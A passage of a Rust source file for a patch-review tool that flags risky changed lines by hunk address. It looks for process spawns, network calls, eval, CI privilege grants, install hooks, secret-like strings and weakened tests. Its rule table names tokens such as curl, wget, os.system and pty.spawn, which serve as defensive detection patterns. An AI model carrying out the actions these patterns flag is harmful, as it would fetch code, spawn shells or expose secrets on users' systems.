// DDF integration: code-evidence risk signals with hunk addresses (plan 2026-10-30, Feature A).
// Design/status: docs/PLAN_AGENT_EVIDENCE_AND_OBSERVABILITY.md#feature-a-code-evidence-risk-signals
// Module vault note (bidirectional): obsidian://open?vault=deep-diff-forge.vault&file=Implementation%2FModules%2Fcrates--deep-diff-forge-graph--src--evidence
//! Code evidence: what the changed lines of a patch do, found in the patch alone and pointed at
//! by hunk address and line, so an agent can check each claim instead of trusting it.
//!
//! Every rule lives in one table, `RULES`: one signal, the side of the change it reads, the view it reads
//! (code with comments and strings blanked, or the raw line), where it applies, and what it
//! matches. Evidence is lexical ([`EVIDENCE_BASIS`]): it finds tokens, it never proves a change
//! is safe, and a construct split across lines or built at run time can hide from it.

use crate::lexical::{Language, ScanState, code_view, has_token, is_boundary_blocker, is_ident};
use deep_diff_forge_core::{HunkId, PatchHunk, PatchLineKind, ReviewFile};
use deep_diff_forge_syntax::{ConstructKind, FragmentScan, scan_fragment};

/// The basis of the first rung: what every item carried before [`Basis`] existed, and what an
/// item found by a token on one line still carries.
pub const EVIDENCE_BASIS: &str = Basis::Lexical.label();

/// The most evidence items a file reports; the score still counts every signal found.
pub const MAX_EVIDENCE_PER_FILE: usize = 32;

/// What a changed line does that a reviewer should see first.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum EvidenceSignal {
    /// Rust `unsafe` added.
    UnsafeAdded,
    /// A process is started (`Command::new`, `subprocess`, `child_process`, `exec.Command`).
    ProcessSpawn,
    /// A network call or download (`reqwest`, `requests`, `fetch(`, `curl`, `wget`).
    NetworkFetch,
    /// Code built and run from data (`eval(`, `exec(`, `new Function(`, shell `eval`).
    DynamicEval,
    /// A CI workflow gains a privilege (`pull_request_target`, write permissions, inherited
    /// secrets).
    CiPrivilege,
    /// Code that runs at build or install time (`build.rs`, `setup.py`, npm install hooks).
    BuildHook,
    /// Text shaped like a credential (a private key header, a cloud or forge token).
    SecretLike,
    /// A lint, type or coverage check is switched off (`#[allow(`, `# noqa`, `@ts-ignore`).
    CheckSuppressed,
    /// A test is removed.
    TestRemoved,
    /// A test is switched off where it stands (`#[ignore]`, `pytest.mark.skip`, `it.skip(`,
    /// `t.Skip(`): it still reads as a test and checks nothing.
    TestSkipped,
    /// An assertion that cannot fail (`assert!(true)`, `assert True`, `expect(true).toBe(true)`).
    TrivialAssert,
    /// A placeholder where code should be (`todo!(`, `unimplemented!(`,
    /// `raise NotImplementedError`).
    StubAdded,
    /// An error is caught and dropped: an `except` whose body is `pass`, an empty `catch` block,
    /// an empty `if err != nil` block, `_ = err`, an `Err(_)` arm that does nothing.
    ErrorSwallowed,
    /// A call that panics on failure is added to code that is not a test (Rust `.unwrap()`,
    /// `.expect(`).
    PanicPathAdded,
}

impl EvidenceSignal {
    /// Every signal, in the order scores and output list them.
    pub const ALL: [Self; 14] = [
        Self::UnsafeAdded,
        Self::ProcessSpawn,
        Self::NetworkFetch,
        Self::DynamicEval,
        Self::CiPrivilege,
        Self::BuildHook,
        Self::SecretLike,
        Self::CheckSuppressed,
        Self::TestRemoved,
        Self::TestSkipped,
        Self::TrivialAssert,
        Self::StubAdded,
        Self::ErrorSwallowed,
        Self::PanicPathAdded,
    ];

    /// Stable snake-case label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::UnsafeAdded => "unsafe_added",
            Self::ProcessSpawn => "process_spawn",
            Self::NetworkFetch => "network_fetch",
            Self::DynamicEval => "dynamic_eval",
            Self::CiPrivilege => "ci_privilege",
            Self::BuildHook => "build_hook",
            Self::SecretLike => "secret_like",
            Self::CheckSuppressed => "check_suppressed",
            Self::TestRemoved => "test_removed",
            Self::TestSkipped => "test_skipped",
            Self::TrivialAssert => "trivial_assert",
            Self::StubAdded => "stub_added",
            Self::ErrorSwallowed => "error_swallowed",
            Self::PanicPathAdded => "panic_path_added",
        }
    }

    /// The score a file gains once for carrying this signal (the one weight table).
    #[must_use]
    pub const fn weight(self) -> u32 {
        match self {
            Self::SecretLike => 5,
            Self::UnsafeAdded | Self::ProcessSpawn | Self::DynamicEval | Self::CiPrivilege => 4,
            Self::NetworkFetch
            | Self::BuildHook
            | Self::TestRemoved
            | Self::TestSkipped
            | Self::TrivialAssert
            | Self::StubAdded
            | Self::ErrorSwallowed => 3,
            Self::CheckSuppressed | Self::PanicPathAdded => 2,
        }
    }

    /// Whether the signal is about a test losing its force. Such a signal lives in test files, so
    /// a test path does not halve its weight as it does every other signal's.
    #[must_use]
    pub const fn weakens_a_test(self) -> bool {
        matches!(
            self,
            Self::TestRemoved | Self::TestSkipped | Self::TrivialAssert
        )
    }
}

/// Which side of the change a line is on.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Side {
    /// An added line, numbered on the new side.
    New,
    /// A removed line, numbered on the old side.
    Old,
}

impl Side {
    /// Stable label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::New => "new",
            Self::Old => "old",
        }
    }
}

/// How an evidence item was found: the rung of the evidence ladder that confirmed it. A higher
/// rung sees more than a lower one, and an item states the highest that found it.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Basis {
    /// One changed line, comments and strings blanked, matched by token.
    Lexical,
    /// A changed line read with its neighbours on the same side of the hunk.
    Hunk,
    /// The side of the hunk parsed as a fragment of its language: the construct itself, read
    /// by the parser, with no error above it.
    SyntaxFragment,
}

impl Basis {
    /// Stable label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::Lexical => "lexical",
            Self::Hunk => "hunk",
            Self::SyntaxFragment => "syntax_fragment",
        }
    }
}

/// One piece of evidence: a signal at a line of a hunk.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Evidence {
    pub signal: EvidenceSignal,
    /// The rung that found it ([`Basis`]).
    pub basis: Basis,
    /// The hunk, by id (for anchors) and by address (for machines).
    pub hunk: HunkId,
    pub address: String,
    pub side: Side,
    /// The line number on `side`.
    pub line: u32,
}

/// What part of a line a rule reads.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum View {
    /// Comments and string contents blanked.
    Code,
    /// The line as written (a suppression lives in a comment, a secret in a string).
    Raw,
}

/// Where a rule applies.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Scope {
    /// Files of these languages.
    Languages(&'static [Language]),
    /// Any file, any language or none.
    Any,
    /// CI workflow definitions (`.github/workflows/*.yml`, `.gitlab-ci.yml`).
    CiWorkflow,
    /// Build and install scripts (`build.rs`, `setup.py`).
    BuildScript,
    /// `package.json`.
    PackageJson,
}

/// What a rule looks for.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Match {
    /// Any of these tokens. A trailing `*` makes a token a prefix (no boundary after it).
    Tokens(&'static [&'static str]),
    /// Any line with code on it.
    AnyCode,
    /// A credential-shaped string ([`looks_like_secret`]).
    Secret,
    /// A JS import of one of these modules ([`imports_module`]).
    Imports(&'static [&'static str]),
    /// An error handler with nothing in it ([`empty_handler`]). It reads the line and the next
    /// line on the same side of the hunk, so what it finds has [`Basis::Hunk`].
    EmptyHandler,
    /// A call of a method with one of these names: `.name(` in the code view.
    Method(&'static [&'static str]),
}

impl Match {
    /// The rung a match of this kind stands on.
    const fn basis(self) -> Basis {
        match self {
            Self::EmptyHandler => Basis::Hunk,
            Self::Tokens(_) | Self::AnyCode | Self::Secret | Self::Imports(_) | Self::Method(_) => {
                Basis::Lexical
            }
        }
    }
}

#[derive(Debug, Clone, Copy)]
struct Rule {
    signal: EvidenceSignal,
    side: Side,
    view: View,
    scope: Scope,
    matches: Match,
}

const RUST: &[Language] = &[Language::Rust];
const PYTHON: &[Language] = &[Language::Python];
const JS: &[Language] = &[Language::JavaScript];
const GO: &[Language] = &[Language::Go];
const SHELL: &[Language] = &[Language::Shell];
const SHELL_OR_YAML: &[Language] = &[Language::Shell, Language::Yaml];

const fn rule(
    signal: EvidenceSignal,
    side: Side,
    view: View,
    scope: Scope,
    matches: Match,
) -> Rule {
    Rule {
        signal,
        side,
        view,
        scope,
        matches,
    }
}

use EvidenceSignal as S;

/// Every evidence rule. A test builds one positive case per token from this table, so a token
/// cannot be added without a case that finds it.
const RULES: &[Rule] = &[
    rule(
        S::UnsafeAdded,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["unsafe"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["Command::new", "process::Command"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "subprocess.",
            "os.system(",
            "os.popen(",
            "os.exec*",
            "os.spawn*",
            "pty.spawn(",
        ]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["child_process", "execSync(", "spawnSync(", "execFileSync("]),
    ),
    // The module is always named in a string, which the code view blanks, so the specifier is
    // read from the raw line wherever the code view shows an import.
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Imports(&["child_process"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["exec.Command(", "exec.CommandContext(", "syscall.Exec("]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&[
            "reqwest::",
            "ureq::",
            "TcpStream::connect",
            "UdpSocket::bind",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "requests.",
            "urllib.request",
            "http.client",
            "socket.socket(",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "fetch(",
            "XMLHttpRequest",
            "http.request(",
            "https.request(",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["http.Get(", "http.Post(", "http.NewRequest(", "net.Dial("]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(SHELL_OR_YAML),
        Match::Tokens(&["curl", "wget"]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["eval(", "exec(", "compile(", "__import__("]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["eval(", "new Function("]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(SHELL),
        Match::Tokens(&["eval"]),
    ),
    rule(
        S::CiPrivilege,
        Side::New,
        View::Code,
        Scope::CiWorkflow,
        Match::Tokens(&[
            "pull_request_target",
            "write-all",
            "contents: write",
            "id-token: write",
            "packages: write",
            "actions: write",
            "secrets: inherit",
        ]),
    ),
    rule(
        S::BuildHook,
        Side::New,
        View::Code,
        Scope::BuildScript,
        Match::AnyCode,
    ),
    rule(
        S::BuildHook,
        Side::New,
        View::Raw,
        Scope::PackageJson,
        Match::Tokens(&[
            "\"preinstall\"",
            "\"install\"",
            "\"postinstall\"",
            "\"prepare\"",
        ]),
    ),
    rule(
        S::SecretLike,
        Side::New,
        View::Raw,
        Scope::Any,
        Match::Secret,
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(RUST),
        Match::Tokens(&["#[allow(", "#![allow("]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "# noqa",
            "#noqa",
            "# type: ignore",
            "# nosec",
            "# pragma: no cover",
        ]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(JS),
        Match::Tokens(&[
            "eslint-disable",
            "@ts-ignore",
            "@ts-nocheck",
            "@ts-expect-error",
        ]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(GO),
        Match::Tokens(&["//nolint", "// nolint", "#nosec"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["#[test]", "#[tokio::test]", "#[rstest]"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["def test*", "async def test*"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["it(", "test(", "describe("]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["func Test*"]),
    ),
    // An attribute or a decorator is code, so a skip named in a comment or a string is not one.
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["#[ignore"]),
    ),
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "pytest.mark.skip*",
            "pytest.mark.xfail",
            "pytest.skip(",
            "unittest.skip*",
            "self.skipTest(",
        ]),
    ),
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "it.skip(",
            "test.skip(",
            "describe.skip(",
            "it.todo(",
            "test.todo(",
            "xit(",
            "xtest(",
            "xdescribe(",
        ]),
    ),
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["t.Skip(", "t.Skipf(", "t.SkipNow("]),
    ),
    rule(
        S::TrivialAssert,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["assert!(true)", "assert_eq!(true, true)"]),
    ),
    rule(
        S::TrivialAssert,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["assert True", "self.assertTrue(True)"]),
    ),
    rule(
        S::TrivialAssert,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "expect(true).toBe(true)",
            "expect(true).toEqual(true)",
            "assert(true)",
            "assert.ok(true)",
        ]),
    ),
    // A placeholder named in a message string is blanked with the string, so only the forms
    // that are code are read: JS and Go have none.
    rule(
        S::StubAdded,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["todo!(", "unimplemented!("]),
    ),
    rule(
        S::StubAdded,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["raise NotImplementedError"]),
    ),
    // An arm that names no error and does nothing is on one line: a token finds it.
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["Err(_) => {}", "Err(_) => ()"]),
    ),
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["_ = err"]),
    ),
    // By spelling this cannot tell a test from other code: the path halves it on a test path,
    // and the parser withdraws it where the hunk shows a test around it ([`fragment_evidence`]).
    rule(
        S::PanicPathAdded,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Method(&["unwrap", "expect"]),
    ),
    // A handler and its empty body are often two lines: these read the next line too.
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::EmptyHandler,
    ),
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::EmptyHandler,
    ),
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::EmptyHandler,
    ),
];

/// What a file is, for rule scopes.
struct FileKind {
    language: Option<Language>,
    ci_workflow: bool,
    build_script: bool,
    package_json: bool,
}

impl FileKind {
    fn of(file: &ReviewFile) -> Self {
        let path = file.path.as_str();
        let name = path.rsplit('/').next().unwrap_or(path);
        // A shebang is read from the first line of a new side that starts at line 1.
        let first_line = file
            .patch_twin
            .hunks
            .first()
            .filter(|h| h.new_start == Some(1))
            .and_then(|h| h.lines.iter().find(|l| l.kind != PatchLineKind::Removed))
            .map(|l| l.text.as_str());
        // One extension table: the lexical layer's.
        let yaml = Language::of(path, None) == Some(Language::Yaml);
        let generated = crate::risk::is_generated_or_vendored(path);
        Self {
            language: Language::of(path, first_line),
            ci_workflow: ((path.starts_with(".github/workflows/")
                || path.contains("/.github/workflows/"))
                && yaml)
                || name == ".gitlab-ci.yml",
            // These two are path-scoped (the file's role, not its tokens), so like every path
            // signal they do not apply under a generated or vendored path. Token rules do.
            build_script: (name == "build.rs" || name == "setup.py") && !generated,
            package_json: name == "package.json" && !generated,
        }
    }

    fn admits(&self, scope: Scope) -> bool {
        match scope {
            Scope::Any => true,
            Scope::Languages(languages) => self.language.is_some_and(|l| languages.contains(&l)),
            Scope::CiWorkflow => self.ci_workflow,
            Scope::BuildScript => self.build_script,
            Scope::PackageJson => self.package_json,
        }
    }
}

/// Every piece of evidence in `file`, in hunk order, then line order, then rule order, with no
/// duplicates and no cap (callers cap what they print with [`MAX_EVIDENCE_PER_FILE`]).
#[must_use]
pub fn file_evidence(file: &ReviewFile) -> Vec<Evidence> {
    let kind = FileKind::of(file);
    let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
    let mut out: Vec<Evidence> = Vec::new();
    if rules.is_empty() {
        return out;
    }
    for hunk in &file.patch_twin.hunks {
        let mut address = None;
        // `hunk_matches` yields each (side, signal, line) once and items from different hunks
        // differ in `hunk`, so there is nothing to deduplicate: a scan of `out` per item made a
        // patch of 160k matching lines take 4.8 s.
        for (side, signal, line, basis) in hunk_matches(hunk, kind.language, &rules) {
            let address = address
                .get_or_insert_with(|| hunk.address(&file.path))
                .clone();
            out.push(Evidence {
                signal,
                basis,
                hunk: hunk.id,
                address,
                side,
                line,
            });
        }
    }
    out
}

/// The distinct signals in one hunk of `file`, in [`EvidenceSignal::ALL`] order: the labels the
/// outline and hunk views show. The same scan as [`file_evidence`], so a view never disagrees
/// with the rank.
#[must_use]
pub fn hunk_signals(file: &ReviewFile, hunk: &PatchHunk) -> Vec<EvidenceSignal> {
    let kind = FileKind::of(file);
    let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
    let found = hunk_matches(hunk, kind.language, &rules);
    EvidenceSignal::ALL
        .into_iter()
        .filter(|signal| found.iter().any(|(_, s, _, _)| s == signal))
        .collect()
}

/// `(side, signal, line, basis)` for every signal some rule finds on a changed line of `hunk`:
/// once per signal and line however many rules or tokens match, in [`EvidenceSignal::ALL`] order,
/// with the highest [`Basis`] among the rules that matched. Block comments and triple strings are
/// followed through the hunk on each side (state starts fresh per hunk).
fn hunk_matches(
    hunk: &PatchHunk,
    language: Option<Language>,
    rules: &[&Rule],
) -> Vec<(Side, EvidenceSignal, u32, Basis)> {
    // First the code view of every line on each side it belongs to, so a rule that reads a
    // neighbour sees it as code, in the state the scanner reached there.
    let mut old_state = ScanState::default();
    let mut new_state = ScanState::default();
    let views: Vec<(Option<String>, Option<String>)> = hunk
        .lines
        .iter()
        .map(|line| {
            let view = |state: &mut ScanState| language.map(|l| code_view(l, &line.text, state));
            match line.kind {
                PatchLineKind::Context => (view(&mut old_state), view(&mut new_state)),
                PatchLineKind::Added => (None, view(&mut new_state)),
                PatchLineKind::Removed => (view(&mut old_state), None),
            }
        })
        .collect();
    // The code of the next line on `side` after line `at`: the line that follows it in that
    // version of the file, when the hunk holds it.
    let next_on = |side: Side, at: usize| -> Option<&str> {
        let other = match side {
            Side::New => PatchLineKind::Removed,
            Side::Old => PatchLineKind::Added,
        };
        let next = at + 1 + hunk.lines[at + 1..].iter().position(|l| l.kind != other)?;
        let view = match side {
            Side::New => views[next].1.as_deref(),
            Side::Old => views[next].0.as_deref(),
        };
        Some(view.unwrap_or(hunk.lines[next].text.as_str()))
    };
    let mut found = Vec::new();
    for (at, line) in hunk.lines.iter().enumerate() {
        let (side, number, view) = match line.kind {
            PatchLineKind::Context => continue,
            PatchLineKind::Added => (Side::New, line.new_line, views[at].1.as_deref()),
            PatchLineKind::Removed => (Side::Old, line.old_line, views[at].0.as_deref()),
        };
        let Some(number) = number else { continue };
        let hits = |rule: &Rule| {
            let text = match rule.view {
                View::Raw => line.text.as_str(),
                // A rule that reads code needs a language; `Scope::Any` code rules have none.
                View::Code => view.unwrap_or(line.text.as_str()),
            };
            match rule.matches {
                Match::Tokens(tokens) => tokens.iter().any(|t| token_in(text, t)),
                Match::AnyCode => !text.trim().is_empty(),
                Match::Secret => looks_like_secret(text),
                Match::Imports(modules) => imports_module(text, &line.text, modules),
                Match::EmptyHandler => {
                    language.is_some_and(|l| empty_handler(l, text, next_on(side, at)))
                }
                Match::Method(names) => names.iter().any(|name| calls_method(text, name)),
            }
        };
        for signal in EvidenceSignal::ALL {
            let basis = rules
                .iter()
                .filter(|r| r.signal == signal && r.side == side && hits(r))
                .map(|r| r.matches.basis())
                .max();
            if let Some(basis) = basis {
                found.push((side, signal, number, basis));
            }
        }
    }
    if language == Some(Language::Rust) {
        confirm_by_parse(hunk, &views, &mut found);
    }
    found
}

/// Whether `code` calls a method named `name`: `.name(`, with nothing of an identifier between.
fn calls_method(code: &str, name: &str) -> bool {
    code.match_indices(name)
        .any(|(at, _)| code[..at].ends_with('.') && code[at + name.len()..].starts_with('('))
}

/// What the parser says about the added lines of a Rust hunk: `(line index, signal)` pairs it
/// found, and pairs it withdraws because the hunk shows test code around them.
struct Parsed {
    found: Vec<(usize, EvidenceSignal)>,
    withdrawn: Vec<(usize, EvidenceSignal)>,
}

/// Rung 2: parse the new side of a Rust hunk and bring `found` into line with it. A signal the
/// parser finds on an added line is added, or its basis raised to [`Basis::SyntaxFragment`]; a
/// panic path inside a test the hunk shows is withdrawn. Where the parser could not read, and
/// when it gives no answer at all, `found` is left as the lower rungs made it.
fn confirm_by_parse(
    hunk: &PatchHunk,
    views: &[(Option<String>, Option<String>)],
    found: &mut Vec<(Side, EvidenceSignal, u32, Basis)>,
) {
    let Some(parsed) = fragment_evidence(hunk, views) else {
        return;
    };
    for (index, signal) in parsed.withdrawn {
        if let Some(number) = hunk.lines[index].new_line {
            found.retain(|item| (item.0, item.1, item.2) != (Side::New, signal, number));
        }
    }
    for (index, signal) in parsed.found {
        let Some(number) = hunk.lines[index].new_line else {
            continue;
        };
        match found
            .iter_mut()
            .find(|item| (item.0, item.1, item.2) == (Side::New, signal, number))
        {
            Some(item) => item.3 = item.3.max(Basis::SyntaxFragment),
            None => found.push((Side::New, signal, number, Basis::SyntaxFragment)),
        }
    }
    // Hunk order, then the order of `EvidenceSignal::ALL`, as before the parse.
    let place = |line: &(Side, EvidenceSignal, u32, Basis)| {
        let at = hunk.lines.iter().position(|l| match line.0 {
            Side::New => l.kind == PatchLineKind::Added && l.new_line == Some(line.2),
            Side::Old => l.kind == PatchLineKind::Removed && l.old_line == Some(line.2),
        });
        (at, EvidenceSignal::ALL.iter().position(|s| *s == line.1))
    };
    found.sort_by_key(place);
}

/// The new side of `hunk` (context and added lines) parsed as a fragment, after the braces the
/// hunk leaves open are closed and the ones it closes without opening are opened. Up to three
/// wrappings are tried and the one the parser reads most of is kept. `None` when there is no
/// answer (over budget, or nothing added).
fn fragment_evidence(
    hunk: &PatchHunk,
    views: &[(Option<String>, Option<String>)],
) -> Option<Parsed> {
    let side: Vec<usize> = (0..hunk.lines.len())
        .filter(|at| hunk.lines[*at].kind != PatchLineKind::Removed)
        .collect();
    if !side
        .iter()
        .any(|at| hunk.lines[*at].kind == PatchLineKind::Added)
    {
        return None;
    }
    // Braces are counted on the code view, where a brace in a string or a comment is blank.
    let (mut unopened, mut open) = (0usize, 0usize);
    for at in &side {
        let code = views[*at]
            .1
            .as_deref()
            .unwrap_or(hunk.lines[*at].text.as_str());
        for byte in code.bytes() {
            match byte {
                b'{' => open += 1,
                b'}' if open == 0 => unopened += 1,
                b'}' => open -= 1,
                _ => {}
            }
        }
    }
    let body: Vec<&str> = side
        .iter()
        .map(|at| hunk.lines[*at].text.as_str())
        .collect();
    let body = body.join("\n");
    let rows = u32::try_from(side.len()).ok()?;
    let closers = "}".repeat(open + unopened + 1);
    // Each wrapping puts its opening on one line of its own, so a body row is a tree row less one.
    let mut wrappings: Vec<(String, u32)> = Vec::new();
    if unopened == 0 && open == 0 {
        wrappings.push((body.clone(), 0));
    }
    wrappings.push((
        format!(
            "fn ddf_fragment() {{{}\n{body}\n{closers}",
            " {".repeat(unopened)
        ),
        1,
    ));
    if unopened > 0 {
        // The innermost block the hunk closes may be a `match`.
        wrappings.push((
            format!(
                "fn ddf_fragment() {{{} match ddf_fragment {{\n{body}\n{closers}",
                " {".repeat(unopened - 1)
            ),
            1,
        ));
    }
    let mut best: Option<(u32, FragmentScan, u32)> = None;
    for (source, offset) in wrappings {
        let Some(scan) = scan_fragment(deep_diff_forge_syntax::Language::Rust, &source) else {
            continue;
        };
        let unread = (0..rows).filter(|row| !scan.readable(row + offset)).count();
        let unread = u32::try_from(unread).unwrap_or(u32::MAX);
        if best.as_ref().is_none_or(|(least, _, _)| unread < *least) {
            best = Some((unread, scan, offset));
        }
        if unread == 0 {
            break;
        }
    }
    let (_, scan, offset) = best?;
    let mut parsed = Parsed {
        found: Vec::new(),
        withdrawn: Vec::new(),
    };
    for construct in &scan.constructs {
        let Some(row) = construct.row.checked_sub(offset) else {
            continue;
        };
        let Some(index) = side.get(row as usize).copied() else {
            continue;
        };
        if hunk.lines[index].kind != PatchLineKind::Added {
            continue;
        }
        match signal_of(&construct.kind) {
            Some(S::PanicPathAdded) if construct.in_test => {
                parsed.withdrawn.push((index, S::PanicPathAdded));
            }
            Some(signal) => parsed.found.push((index, signal)),
            None => {}
        }
    }
    Some(parsed)
}

/// The signal a Rust construct is evidence of, if any.
fn signal_of(kind: &ConstructKind) -> Option<EvidenceSignal> {
    match kind {
        ConstructKind::Attribute { words } => {
            let first = words.first().map(String::as_str);
            let ignored = first == Some("ignore")
                || (first == Some("cfg_attr") && words.iter().skip(1).any(|w| w == "ignore"));
            ignored.then_some(S::TestSkipped)
        }
        ConstructKind::MacroCall { name, arguments } => match name.as_str() {
            "assert" | "debug_assert" => {
                (arguments == "true" || arguments.starts_with("true,")).then_some(S::TrivialAssert)
            }
            "assert_eq" | "debug_assert_eq" => (arguments == "true,true"
                || arguments.starts_with("true,true,"))
            .then_some(S::TrivialAssert),
            "todo" | "unimplemented" => Some(S::StubAdded),
            _ => None,
        },
        ConstructKind::MethodCall { name } => {
            matches!(name.as_str(), "unwrap" | "expect").then_some(S::PanicPathAdded)
        }
    }
}

/// Whether `code` (a line's code view) opens an error handler that does nothing, given the code
/// of the line after it on the same side (`None` when the hunk ends there).
///
/// - Python: `except …:` whose body is `pass` or `...`, on the same line or the next.
/// - JS and TS: `catch`, with or without a binding, whose block is empty: `{}` on the line, or
///   `{` ending the line and `}` starting the next.
/// - Go: `if err != nil {`, with or without a statement before the test, closed at once, on the
///   line or the next.
///
/// A handler whose body the hunk does not show is not evidence: the next line must be there.
fn empty_handler(language: Language, code: &str, next: Option<&str>) -> bool {
    let line = code.trim();
    let next = next.map(str::trim);
    let nothing = |body: &str| matches!(body, "pass" | "...");
    // The block after `head` is empty: `{}` here, or `{` here and `}` first on the next line.
    let empty_block = |after: &str| {
        let after = after.trim();
        let closed_here = after
            .strip_prefix('{')
            .is_some_and(|rest| rest.trim_start().starts_with('}'));
        closed_here || (after == "{" && next.is_some_and(|n| n.starts_with('}')))
    };
    match language {
        Language::Python => {
            let Some(rest) = line.strip_prefix("except") else {
                return false;
            };
            if rest.as_bytes().first().is_some_and(|b| is_ident(*b)) {
                return false;
            }
            let Some((_, body)) = rest.rsplit_once(':') else {
                return false;
            };
            let body = body.trim();
            nothing(body) || (body.is_empty() && next.is_some_and(nothing))
        }
        Language::JavaScript => line.match_indices("catch").any(|(at, word)| {
            let before_ok = at == 0 || !is_boundary_blocker(line.as_bytes()[at - 1]);
            let after = line[at + word.len()..].trim_start();
            if !before_ok || after.as_bytes().first().is_some_and(|b| is_ident(*b)) {
                return false;
            }
            // An optional binding in parentheses, then the block.
            let after = match after.strip_prefix('(') {
                Some(binding) => match binding.split_once(')') {
                    Some((_, block)) => block,
                    None => return false,
                },
                None => after,
            };
            empty_block(after)
        }),
        // `if err != nil {` and `if err := f(); err != nil {`: the test comes last in the head.
        Language::Go => line.strip_prefix("if ").is_some_and(|head| {
            head.rsplit_once("err != nil")
                .is_some_and(|(_, after)| empty_block(after))
        }),
        Language::Rust | Language::Shell | Language::Yaml => false,
    }
}

/// Whether a JS line loads one of `modules` (`node:` optional) with `require(…)` (also
/// `module.require`), `import(…)`, `import …` or `from …`. The keyword and the opening quote must
/// be code in `code` (the line's code view), so a comment or a string that mentions an import
/// does not count; the specifier is read from `raw` at the same offset. A type-only statement
/// (`import type`, `export type`) and `typeof import(…)` load nothing and do not count
/// (`typeof require(…)` still calls `require`); an
/// `import(…)` type annotation does (it errs toward evidence).
fn imports_module(code: &str, raw: &str, modules: &[&str]) -> bool {
    let c = code.as_bytes();
    let specifier_at = |at: usize, keyword: &str| -> Option<&str> {
        let before = &code[..at];
        let receiver_ok = at == 0
            || !is_boundary_blocker(c[at - 1])
            || (keyword == "require" && before.ends_with("module."));
        let after = at + keyword.len();
        if !receiver_ok
            || c.get(after).is_some_and(|b| is_ident(*b))
            || (keyword == "import" && before.trim_end().ends_with("typeof"))
        {
            return None;
        }
        // Whitespace and any number of `(` may sit between the keyword and the specifier.
        let gap = c[after..]
            .iter()
            .take_while(|b| b.is_ascii_whitespace() || **b == b'(')
            .count();
